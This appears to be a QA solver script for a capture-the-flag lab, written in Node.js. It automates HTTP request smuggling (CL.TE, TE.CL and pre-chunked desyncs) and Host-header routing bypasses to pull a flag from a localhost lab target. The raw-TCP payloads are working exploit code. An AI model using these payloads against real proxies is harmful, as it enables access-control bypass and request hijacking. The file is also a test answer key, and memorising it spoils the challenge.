#!/usr/bin/env node
/*
 * VLH-CTF QA solver — ASLV M1 (aslv-edge), INTENDED PATH (FR-14).
 *
 * Bug class: HTTP — request smuggling (CL.TE desync between edge-front and
 * edge-back) + host-header routing bypass into the location-locked internal
 * zone. Flag: ASLV{HTTP-...} at edge-back /internal/flag (only reachable with
 * Host: internal.aslv.lab inside the internal context).
 *
 * Paths attempted, in order (first one that yields the flag wins):
 *   1. DIRECT edge-front port (deterministic lab bench; compose should expose
 *      18027 in m1 profile / 18028 in full mode — see qa/README known gaps):
 *        a. CL.TE "leftover" smuggle (README variant 1, EDGE_MODE=cl-te)
 *        b. duplicate-Host host-routing bypass (GET /flag + two Host headers)
 *        c. TE.CL / TE.TE variant (EDGE_MODE=te-cl|te-te), best-effort
 *   2. THROUGH the nginx gateway (M1_URL, Host: edge.aslv.lab):
 *        a. absolute-form-vs-Host mismatch (GET http://edge.aslv.lab/flag with
 *           Host: internal.aslv.lab — nginx-version-dependent, README §2)
 *        b. pre-chunked CL.TE smuggle (payload fully INSIDE the declared
 *           Content-Length, so the gateway streams it verbatim) + a pipelined
 *           follow-up request, retried a few times (the smuggled response
 *           relay through the gateway is best-effort per module README)
 *
 * Env: M1_URL (default http://localhost:18021 — m1 standalone gateway),
 *      M1_DIRECT_URL (optional explicit edge-front port, e.g. http://localhost:18027).
 * Node 20+ built-ins only. Exit 0 only when ASLV{HTTP-...} is captured.
 */
import net from 'node:net';

const M1_URL = process.env.M1_URL || 'http://localhost:18021';
const BASE = new URL(M1_URL);
const GW_HOST = BASE.hostname;
const GW_PORT = Number(BASE.port || 80);
const EDGE_VHOST = `edge.aslv.lab${GW_PORT ? `:${GW_PORT}` : ''}`;
const FLAG_RE = /ASLV\{HTTP-\d{9,10}\}/;

/* Direct edge-front candidates: explicit env, else the compose-mandated ports
 * (m1 standalone → 18027, full → 18028). */
const DIRECT_CANDIDATES = [];
if (process.env.M1_DIRECT_URL) DIRECT_CANDIDATES.push(Number(new URL(process.env.M1_DIRECT_URL).port || 80));
else if (GW_PORT === 18021) DIRECT_CANDIDATES.push(18027);
else if (GW_PORT === 18024) DIRECT_CANDIDATES.push(18028);

const log = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const warn = (m) => console.log(`[!] ${m}`);
const die = (m) => { console.error(`[-] ${m}`); process.exit(1); };

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/* ------------------------------------------------------------------ raw TCP */
/*
 * Send `payload` on a fresh socket, collect everything that comes back until
 * the peer closes or the stream goes quiet (no data for `quietMs`), capped by
 * `timeoutMs`. Resolves { text, bytes } — never rejects on clean conditions so
 * smuggling attempts can be stacked; only network-level refusals reject.
 */
function rawExchange(port, payload, { timeoutMs = 8000, quietMs = 700, host = GW_HOST } = {}) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let settled = false;
    let quietTimer = null;
    const sock = net.connect({ host, port });
    const finish = (err) => {
      if (settled) return;
      settled = true;
      clearTimeout(quietTimer);
      sock.destroy();
      if (err) reject(err);
      else resolve({ text: Buffer.concat(chunks).toString('latin1'), bytes: Buffer.concat(chunks).length });
    };
    const armQuiet = () => {
      clearTimeout(quietTimer);
      quietTimer = setTimeout(() => finish(), quietMs);
    };
    sock.setTimeout(timeoutMs);
    sock.on('connect', () => { sock.write(payload); armQuiet(); });
    sock.on('data', (c) => { chunks.push(c); armQuiet(); });
    sock.on('timeout', () => finish());
    sock.on('close', () => finish());
    sock.on('error', (e) => finish(e));
  });
}

async function portOpen(port) {
  try {
    const r = await rawExchange(port, 'GET /healthz HTTP/1.1\r\nHost: edge.aslv.lab\r\nConnection: close\r\n\r\n', { timeoutMs: 3000, quietMs: 400 });
    return /HTTP\/1\.[01] 200/.test(r.text) || /edge-back/.test(r.text);
  } catch (_) {
    return false;
  }
}

const SMUGGLED = 'GET /internal/flag HTTP/1.1\r\nHost: internal.aslv.lab\r\nX-Vlh-Solver: 1\r\n\r\n';

function extractFlag(text) {
  const m = FLAG_RE.exec(text);
  return m ? m[0] : null;
}

/* ---------------------------------------------------- direct-port attempts */

async function directLeftoverSmuggle(port) {
  // CL.TE (EDGE_MODE=cl-te): the front reads exactly CL bytes as the body and
  // appends everything after it RAW to the re-framed upstream request — the
  // back-end (TE rule) parses those bytes as its next pipelined request.
  const body = 'q=desync';
  const payload =
    'POST /app/search HTTP/1.1\r\n'
    + `Host: edge.aslv.lab\r\n`
    + 'Content-Type: application/x-www-form-urlencoded\r\n'
    + `Content-Length: ${Buffer.byteLength(body)}\r\n`
    + '\r\n'
    + body
    + SMUGGLED;
  const r = await rawExchange(port, payload);
  const statusCount = (r.text.match(/HTTP\/1\.[01] \d{3}/g) || []).length;
  ok(`direct CL.TE leftover smuggle: ${statusCount} response(s), ${r.bytes} bytes`);
  return extractFlag(r.text);
}

async function directDupHostBypass(port) {
  // Host-routing bypass: a parsed request carrying the internal host in a
  // DUPLICATE Host header is re-routed into the internal zone by edge-front.
  const payload =
    'GET /flag HTTP/1.1\r\n'
    + 'Host: edge.aslv.lab\r\n'
    + 'Host: internal.aslv.lab\r\n'
    + 'Connection: close\r\n'
    + '\r\n';
  const r = await rawExchange(port, payload);
  const first = (r.text.match(/HTTP\/1\.[01] \d{3}/g) || [])[0] || 'no status';
  ok(`direct duplicate-Host bypass: ${first}, ${r.bytes} bytes`);
  return extractFlag(r.text);
}

async function directTeClSmuggle(port) {
  // TE.CL / TE.TE (EDGE_MODE=te-cl|te-te): client sends CL + TE; the front
  // honors TE, de-chunks, then re-sends with the CLIENT's CL verbatim — the
  // back-end stops after CL bytes and parses the remainder as its next request.
  const smuggledBuf = Buffer.from(SMUGGLED, 'latin1');
  const chunkedBody = `4\r\nXXXX\r\n${smuggledBuf.length.toString(16)}\r\n${SMUGGLED}0\r\n\r\n`;
  const payload =
    'POST /app/search HTTP/1.1\r\n'
    + `Host: edge.aslv.lab\r\n`
    + 'Content-Type: application/x-www-form-urlencoded\r\n'
    + 'Content-Length: 4\r\n'
    + 'Transfer-Encoding: chunked\r\n'
    + '\r\n'
    + chunkedBody;
  const r = await rawExchange(port, payload);
  const statusCount = (r.text.match(/HTTP\/1\.[01] \d{3}/g) || []).length;
  ok(`direct TE.CL/TE.TE smuggle: ${statusCount} response(s), ${r.bytes} bytes`);
  return extractFlag(r.text);
}

/* ---------------------------------------------------- gateway attempts */

async function gatewayAbsoluteFormMismatch() {
  // README §2: nginx routes by the absolute URI, but the edge vhost forwards
  // the client's $http_host — so absolute-form=edge + Host=internal makes the
  // FRONT see the internal host while the request still lands on the edge
  // vhost. Single clean response; nginx-version-dependent.
  const payload =
    'GET http://edge.aslv.lab/flag HTTP/1.1\r\n'
    + 'Host: internal.aslv.lab\r\n'
    + 'Connection: close\r\n'
    + '\r\n';
  const r = await rawExchange(GW_PORT, payload, { host: GW_HOST });
  const first = (r.text.match(/HTTP\/1\.[01] \d{3}/g) || [])[0] || 'no status';
  ok(`gateway absolute-form-vs-Host mismatch: ${first}, ${r.bytes} bytes`);
  return extractFlag(r.text);
}

async function gatewayPrechunkedSmuggle(attempt) {
  // The whole smuggle sits INSIDE the declared Content-Length, so the gateway
  // (an RFC-correct proxy) streams it to edge-front verbatim. edge-front sees
  // a CL body that is itself complete chunked framing and passes it through
  // VERBATIM with `Transfer-Encoding: chunked` — the back-end (TE rule) stops
  // at the embedded 0-chunk and parses the packed request as its next one.
  // The smuggled response rides back best-effort (it may be appended to the
  // visible response or absorbed as the response to our pipelined follow-up).
  const body = `0\r\n\r\n${SMUGGLED}`;
  const smuggleA =
    'POST /app/search HTTP/1.1\r\n'
    + `Host: ${EDGE_VHOST}\r\n`
    + 'Content-Type: application/x-www-form-urlencoded\r\n'
    + `Content-Length: ${Buffer.byteLength(body, 'latin1')}\r\n`
    + '\r\n'
    + body;
  const followUp =
    'GET /app HTTP/1.1\r\n'
    + `Host: ${EDGE_VHOST}\r\n`
    + 'Connection: close\r\n'
    + '\r\n';
  const r = await rawExchange(GW_PORT, smuggleA + followUp, { host: GW_HOST, timeoutMs: 9000, quietMs: 800 });
  const statusCount = (r.text.match(/HTTP\/1\.[01] \d{3}/g) || []).length;
  ok(`gateway pre-chunked CL.TE smuggle (attempt ${attempt}): ${statusCount} response(s), ${r.bytes} bytes`);
  return extractFlag(r.text);
}

async function main() {
  log(`M1 target: ${M1_URL} (edge vhost: ${EDGE_VHOST})`);
  let flag = null;

  /* probe the gateway */
  let gwUp = false;
  try {
    const r = await rawExchange(GW_PORT, 'GET /healthz HTTP/1.1\r\nHost: edge.aslv.lab\r\nConnection: close\r\n\r\n', { timeoutMs: 4000, quietMs: 500 });
    gwUp = /HTTP\/1\.[01] \d{3}/.test(r.text);
  } catch (e) {
    if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
      die(`cannot connect to ${M1_URL} (${e.code}) — is the m1 profile running?  docker compose --profile m1 up -d`);
    }
    warn(`gateway probe error: ${e.message}`);
  }
  if (!gwUp) die(`gateway at ${M1_URL} did not answer the /healthz probe (Host: edge.aslv.lab)`);
  ok('gateway reachable (edge vhost answered /healthz)');

  /* 1. direct edge-front port (deterministic bench) */
  for (const port of DIRECT_CANDIDATES) {
    if (await portOpen(port)) {
      ok(`direct edge-front port ${port} is exposed — using the deterministic lab bench`);
      for (const [name, fn] of [
        ['CL.TE leftover smuggle', directLeftoverSmuggle],
        ['duplicate-Host routing bypass', directDupHostBypass],
        ['TE.CL/TE.TE smuggle', directTeClSmuggle],
      ]) {
        try {
          log(`direct: attempting ${name}`);
          flag = await fn(port);
        } catch (e) {
          warn(`direct ${name} failed: ${e.message}`);
        }
        if (flag) break;
      }
    } else {
      warn(`direct edge-front port ${port} not reachable (compose does not expose it — see qa/README.md known gaps)`);
    }
    if (flag) break;
  }

  /* 2. through the gateway */
  if (!flag) {
    try {
      log('gateway: attempting absolute-form-vs-Host mismatch');
      flag = await gatewayAbsoluteFormMismatch();
    } catch (e) {
      warn(`gateway absolute-form attempt failed: ${e.message}`);
    }
  }
  if (!flag) {
    for (let i = 1; i <= 4 && !flag; i++) {
      try {
        log(`gateway: attempting pre-chunked CL.TE smuggle (${i}/4)`);
        flag = await gatewayPrechunkedSmuggle(i);
      } catch (e) {
        warn(`gateway smuggle attempt ${i} failed: ${e.message}`);
      }
      if (!flag && i < 4) await sleep(300);
    }
  }

  if (!flag) {
    die('could not reach /internal/flag via any path — '
      + 'check EDGE_MODE (default cl-te) and consider exposing the direct edge-front port (18027/18028, modules/aslv-edge/README.md)');
  }
  console.log(`\n=== M1 intended path: FLAG ${flag} ===`);
  process.exit(0);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
    die(`cannot connect to ${M1_URL} (${e.code}) — is the m1 profile running?  docker compose --profile m1 up -d`);
  }
  die(`unexpected error: ${e && e.stack ? e.stack : e}`);
});
